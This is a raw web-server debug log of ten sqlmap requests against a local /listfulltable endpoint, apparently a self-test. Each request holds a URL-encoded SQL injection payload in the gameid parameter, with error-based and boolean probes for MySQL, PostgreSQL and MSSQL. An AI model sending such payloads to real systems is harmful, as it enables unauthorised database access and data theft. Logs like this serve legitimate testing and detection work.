[D 180302 141520477]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%20%28SELECT%206495%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767871%2C%28SELECT%20%28ELT%286495%3D6495%2C1%29%29%29%2C0x7162767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20fIzF', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141525843]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%201413%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281413%3D1413%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27FduL%27%3D%27FduL', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141531325]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%201413%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281413%3D1413%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27ZedU%27%3D%27ZedU', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141537345]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%201413%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281413%3D1413%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141545944]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%201413%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281413%3D1413%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%289378%3D9378', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141553230]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%201413%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281413%3D1413%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141559178]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%201413%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281413%3D1413%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20MfPh', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141606681]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%208344%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288344%3D8344%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%28%27mrBg%27%3D%27mrBg', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141613676]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%208344%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288344%3D8344%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27xlsO%27%3D%27xlsO', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141619589]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%208344%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288344%3D8344%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
